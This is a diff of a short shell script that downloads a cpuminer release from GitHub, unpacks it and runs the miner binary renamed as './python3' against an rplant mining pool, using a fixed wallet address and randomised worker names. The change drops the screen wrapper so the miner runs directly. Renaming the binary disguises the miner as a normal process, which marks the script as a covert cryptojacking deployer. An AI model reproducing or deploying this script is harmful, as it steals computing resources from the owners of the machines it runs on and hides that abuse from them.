@@ -1,5 +1,3 @@
-apt install screen -y
-
 wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
 
 tar -xzf dot
@@ -16,4 +14,4 @@ cd ~/
 
 nomer=$((RANDOM % 50 + 1))
 
-screen ./python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QhKiKc1JTCBKzTLDC9gszLX13F2MjWAq35.DOT$nomer
+./python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QhKiKc1JTCBKzTLDC9gszLX13F2MjWAq35.DOT$nomer
